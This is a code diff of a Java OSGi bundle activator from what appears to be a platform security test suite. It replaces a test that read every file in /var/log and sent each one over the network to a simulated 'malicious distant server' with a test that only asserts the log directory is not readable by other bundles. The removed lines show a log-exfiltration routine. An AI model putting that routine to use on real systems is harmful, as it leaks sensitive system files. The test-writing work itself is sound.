@@ -47,33 +47,18 @@ public class Activator implements BundleActivator
   		serviceRef = new ServiceTracker(getContext(), Util.class.getName(), null);
   		serviceRef.open();
   		util = (Util) serviceRef.waitForService(30000); 
-  		Assert.assertNotNull(util);
   		
-  		util.start("sysatt110","System log pertinent files hijacking","System log pertinent files hijacking, and sending of these files on the network to malicious distant server");
-	    try
-	    {
-	    	util.sendCmd("sysatt110");
-	    	File dir = new File("/var/log/");
-	        File list[] ;
-	        list = dir.listFiles();
-	        Assert.assertNotNull("No access to /var/log/ directory", list);
-	        for (int i=0; i<list.length; i++)
-	        {
-	        	if (list[i].isFile()&&list[i].canRead())
-	        	{
-	        		util.sendFile(list[i]);
-	        	}
-	        }
-    	    succeed = true;
-	        util.sendCmd("::done::");
-	    }
-	    catch (Exception e)
-	    {
-	        util.err(e);
-	    }
-  		Assert.assertTrue("Test failed", succeed);
+  		Assert.assertNotNull("JUnit test issue: util service is not available even after 30 s", util);
+  		util.start("sysatt110","Access to system log directory","Access to /var/log directory, which contains system log files");
+  		
+  		util.println("\n[TEST] Checking access to /var/log directory...\n");
+  		File dir = new File("/var/log/");
+		File list[] ;
+		list = dir.listFiles();
+		
+		Assert.assertNull("JUnit test issue: logs are accessible by any bundle.", list);
+		
+		succeed = true;
 	    unregisterService();
     }
-  	
-  
 }
